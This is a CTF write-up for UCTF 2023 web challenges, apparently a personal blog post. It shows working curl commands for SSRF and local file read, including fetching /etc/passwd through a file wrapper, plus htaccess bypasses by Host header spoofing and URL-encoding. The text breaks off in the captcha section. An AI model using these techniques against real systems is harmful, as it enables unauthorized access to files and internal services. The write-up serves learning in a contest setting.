<h3> UCTF 2023 </h3>

I played this ctf with my friends

Here's the writeup to the challengs I tried solving:

### Web
-  E Corp.
-  htaccess
-  Captcha1 | the Missing Lake
-  Captcha2 | the Missing Lake 2
-  MongoDB NoSQL Injection

#### E Corp
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e71ca47b-2df7-48be-9a92-52dbbbedd6aa)

From the challenge description we can immediately tell this would be some sort of SSRF

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/53621409-426b-413f-bb7d-b8d2076b6ad4)

We have 4 various blog post

Clicking it just shows some word
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cdaa45ff-4bc7-4a69-af13-5d456b2ea8ed)

Looking at the request made when I click on a blog post shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e2aeadb-e991-407e-9fc9-de1dae9b4c5f)

We have a `POST` request to `/api/view.php`

And the parameter passed is this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/de85eb59-70ae-422b-95e0-9046403faf55)

It is using a `file` wrapper to view the content of `/posts/Azita`

With this we can basically read local files from disk 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b6cb54c6-7e8a-4353-90e3-7ea3a536c427)

```r
curl -s -X POST "https://ecorpblog.uctf.ir/api/view.php" -H "Content-Type: application/json" -d '{"post":"file:///etc/passwd"}' | jq .post -r
```

But how would that help us in accessing the internal domain?

Well since it uses `file` wrapper it's safe to assume we can also make use of other wrappers in this case it will be `http`

With that said we should be able to access the internal domain `http://admin-panel.local`

Doing that works!
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ca1ad5f7-096d-4067-8b3d-08669c628713)

```r
curl -s -X POST "https://ecorpblog.uctf.ir/api/view.php" -H "Content-Type: application/json" -d '{"post":"http://admin-panel.local"}' | jq .post -r
```

Here's the flag

```
Flag: uctf{4z174_1n_urm14}
```

#### Htaccess
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/56adf216-bb38-4497-a090-38d51feab049)

Going over to the url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7e3b3c26-d017-4374-8d61-c8138fe0a285)

So there are two htaccess rules placed on two portions of the flag

We need to bypass them inorder to get the flag

The first one is this:

```
RewriteEngine On
RewriteCond %{HTTP_HOST} !^localhost$
RewriteRule ".*" "-" [F]
```

What this rule enforce is basically that if the `Host` header isn't `localhost` we won't be able to access the file

So to bypass this we can just change the `Host` header to `localhost`

This is what happens if we fail to bypass and try to read the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b9cb159e-7257-4d18-a687-1327a9289eb2)

Cool so let's bypass that
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6a03e6ab-ca72-4b56-8d2a-9467161a1a40)

```r
curl -H "Host: localhost" http://htaccess.uctf.ir/one/flag.txt
```

We get the first portion of the flag

```
uctf{Sule_
```

For the second rule:

```
RewriteEngine On
RewriteCond %{THE_REQUEST} flag
RewriteRule ".*" "-" [F]
```

It checks if the request body contains the string `flag` 

If it does then we will get 403 error

Here's a sample
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/18ca5089-ef40-4032-87cb-b89d01a06d39)

So to bypass this we can just url encode the string `flag` in the url search bar 

And what will happen is that the htaccess check will return False but where as on the server side it will get decoded to `flag` and we get access to it

This solution was given to me by @0xvenus

First I urlencoded `flag` then used it as the file name in the url
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6de8e1a8-13a0-4242-af01-ea1aa06fa2a7)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aefe0048-9e87-4026-bf53-8a1fc6aa5ef9)

```
curl htaccess.uctf.ir/two/%66%6c%61%67.txt;echo
```

We can now join the two portion of the flag 

```
Flag: uctf{Sule_Dukol_waterfall}
```

#### Captcha1 | the Missing Lake 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e89c51b0-3c8c-45c6-968c-5251a3ee51a9)

Going over to the url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/84eeb99d-7440-44c3-88a7-bce6647b9352)

So we are to provide the captcha 300 times before we get the flag

The session cookie is provided
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/074ca712-6663-4cae-95fc-a2e8052ad184)

On each page refresh the value of the image changes
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/011c164f-7bb5-47ad-85ba-054f26382a1a)

We can submit those words from the image manually but what's the fun there 🙂

This is my approach in solving this challenge:
- First I'll need to get the current captcha from the image 
